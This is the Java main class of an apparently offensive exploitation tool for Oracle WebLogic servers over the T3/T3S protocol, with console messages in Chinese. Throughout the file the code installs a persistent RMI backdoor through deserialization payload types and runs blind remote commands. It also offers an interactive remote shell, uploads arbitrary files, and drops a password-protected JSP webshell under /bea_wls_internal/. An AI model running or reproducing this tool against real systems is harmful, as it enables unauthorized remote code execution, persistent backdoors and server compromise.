package com.supeream;

import com.supeream.serial.BytesOperation;
import com.supeream.ssl.WeblogicTrustManager;
import com.supeream.weblogic.WebLogicOperation;
import org.apache.commons.cli.*;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;

import javax.naming.Context;
import javax.naming.NamingException;
import java.io.FileNotFoundException;
import java.util.*;


public class Main {

    public static final String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
    public static final String RMI_NAME = "supeream";
    public static String TYPE = "streamMessageImpl";
    public static List<String> types = Arrays.asList(new String[]{"marshall", "collection", "streamMessageImpl"});
    public static String version;
    public static CommandLine cmdLine;
    private static String cmd = "whoami";

    /**
     * init context
     *
     * @param url
     * @return
     * @throws NamingException
     * @throws FileNotFoundException
     */
    public static Context getInitialContext(String url) throws NamingException, FileNotFoundException {
        Environment environment = new Environment();
        environment.setProviderUrl(url);
        environment.setEnableServerAffinity(false);
        environment.setSSLClientTrustManager(new WeblogicTrustManager());
        return environment.getInitialContext();
    }

    /**
     * check the rmi backdoor is already installed ?
     *
     * @param host
     * @param port
     * @return
     */
    public static boolean checkIsAlreadyInstalled(String host, String port) {
        try {
            System.out.println("检查是否安装rmi实例");
            Context initialContext = getInitialContext(convertUrl(host, port));
            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup(RMI_NAME);
            System.out.println("rmi已经安装");
            invokeRmi(remoteCode);
            return true;
        } catch (Exception e) {
            if (e.getMessage() != null && e.getMessage().contains(RMI_NAME)) {
                System.out.println("rmi实例不存在");
            } else {
                e.printStackTrace();
//                System.exit(0);
            }
        }

        return false;
    }

    /**
     * execute blind command
     *
     * @param host
     * @param port
     * @throws Exception
     */
    public static void executeBlind(String host, String port) throws Exception {
        if (cmdLine.hasOption("B") && cmdLine.hasOption("C")) {
            System.out.println("执行命令:" + cmdLine.getOptionValue("C"));
            WebLogicOperation.blindExecute(host, port, cmdLine.getOptionValue("C"));
            System.out.println("执行blind命令完成");
            System.exit(0);
        }
    }

    private static String convertUrl(String host, String port) {
        if (cmdLine.hasOption("https")) {
            return "t3s://" + host + ":" + port;
        } else {
            return "t3://" + host + ":" + port;
        }
    }

    private static String cdConcat(List<String> cds) {
        StringBuffer stringBuffer = new StringBuffer();
        for (String cd : cds) {
            stringBuffer.append(cd);
            stringBuffer.append("&&");
        }
        return stringBuffer.toString();
    }

    public static void invokeRmi(ClusterMasterRemote remoteCode) throws Exception {
        String result = null;

        if (Main.cmdLine.hasOption("shell")) {
            Scanner scanner = new Scanner(System.in);
            List<String> cacheCmds = new ArrayList<String>();

            while (true) {
                System.out.print("please input cmd:>");
                cmd = scanner.nextLine();
                if (cmd.equalsIgnoreCase("exit")) {
                    System.exit(0);
                }
                if (cmd.startsWith("cd ")) {
                    cacheCmds.add(cmd);
                }

                if (cmd.equalsIgnoreCase("clear")) {
                    cacheCmds.clear();
                    continue;
                }

                if (cmd.equalsIgnoreCase("back")) {
                    cacheCmds.remove(cacheCmds.size() - 1);
                    continue;
                }

                String newCmd = cdConcat(cacheCmds);

                if (!cmd.startsWith("cd ")) {
                    newCmd += cmd;
                } else if (newCmd.length() > 3) {
                    newCmd = newCmd.substring(0, newCmd.length() - 2);
                }


                if (Main.cmdLine.hasOption("noExecPath")) {
                    result = remoteCode.getServerLocation("showmecode$NO$" + newCmd);
                } else {
                    result = remoteCode.getServerLocation("showmecode" + newCmd);
                }

                System.out.println(result);
            }
        } else {
            System.out.println("执行命令:" + cmd);

            if (Main.cmdLine.hasOption("noExecPath")) {
                result = remoteCode.getServerLocation("showmecode$NO$" + cmd);
            } else {
                result = remoteCode.getServerLocation("showmecode" + cmd);
            }
            System.out.println(result);
        }
    }

    public static void main(String[] args) {

        System.setProperty("weblogic.security.allowCryptoJDefaultJCEVerification", "true");
        System.setProperty("weblogic.security.allowCryptoJDefaultPRNG", "true");
        System.setProperty("weblogic.security.SSL.ignoreHostnameVerification", "true");
        System.setProperty("weblogic.security.TrustKeyStore", "DemoTrust");

        Options options = new Options();
        options.addOption("H", true, "Remote Host[need set]");
        options.addOption("P", true, "Remote Port[need set]");
        options.addOption("C", true, "Execute Command[need set]");
        options.addOption("T", true, "Payload Type" + types);
        options.addOption("U", false, "Uninstall rmi");
        options.addOption("B", false, "Runtime Blind Execute Command maybe you should select os type");
        options.addOption("os", true, "Os Type [windows,linux]");
        options.addOption("https", false, "enable https or tls");
        options.addOption("shell", false, "enable shell module");
        options.addOption("upload", false, "enable upload a file");
        options.addOption("src", true, "path to src file ");
        options.addOption("dst", true, "path to dst file ");
        options.addOption("noExecPath", false, "custom execute path");
        options.addOption("uploadShell", false, "upload a one word webshell");


        try {

            String host = "10.211.55.2";
            String port = "7001";
            CommandLineParser parser = new DefaultParser();
            cmdLine = parser.parse(options, args);

            if (cmdLine.hasOption("H")) {
                host = cmdLine.getOptionValue("H");
            } else {
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("supeream", options);
                System.exit(0);
            }

            if (cmdLine.hasOption("P")) {
                port = cmdLine.getOptionValue("P");
            }

            if (cmdLine.hasOption("C")) {
                cmd = cmdLine.getOptionValue("C");
            }

            if (cmdLine.hasOption("T")) {
                TYPE = cmdLine.getOptionValue("T");
            }


            if (cmdLine.hasOption("uploadShell")) {
                System.out.println("开始上传一句话代码");
                String fileName = UUID.randomUUID().toString().replace("-", "");
                WebLogicOperation.uploadFileShell(host, port, fileName);
                String schema = "http://";
                if (cmdLine.hasOption("https")) {
                    schema = "https://";
                }
                System.out.println("上传完毕请查看 path:" + schema + host + ":" + port + "/bea_wls_internal/" + fileName + ".jsp password:qishiwoshiyigehaoren");
                System.exit(0);
            }


            if (cmdLine.hasOption("U")) {
                System.out.println("开始删除rmi实例");
                WebLogicOperation.unInstallRmi(host, port);
                System.out.println("后门删除实例");
                System.exit(0);
            }

            executeBlind(host, port);

            if (Main.cmdLine.hasOption("upload") && Main.cmdLine.hasOption("src") && Main.cmdLine.hasOption("dst")) {
                System.out.println("开始上传文件");
                String path = Main.cmdLine.getOptionValue("src");
                byte[] fileContent = BytesOperation.GetByteByFile(path);
                WebLogicOperation.uploadFile(host, port, Main.cmdLine.getOptionValue("dst"), fileContent);
                System.out.println("file upload success");
                System.exit(0);
            }

            if (checkIsAlreadyInstalled(host, port)) {
                System.exit(0);
            }

            System.out.println("开始安装rmi实例");
            WebLogicOperation.installRmi(host, port);
            System.out.println("等待rmi实例安装成功 ");
            Thread.sleep(2000);

            Context initialContext = getInitialContext(convertUrl(host, port));
            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup(RMI_NAME);
            invokeRmi(remoteCode);

        } catch (Exception e) {
            System.out.println("实例安装失败");
            String msg = e.getMessage();
            if (msg != null && msg.contains("Unrecognized option")) {
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("supeream", options);
            } else {
                System.out.println("实例rmi安装失败 请切换-B模式");
                e.printStackTrace();
            }
        }

    }
}
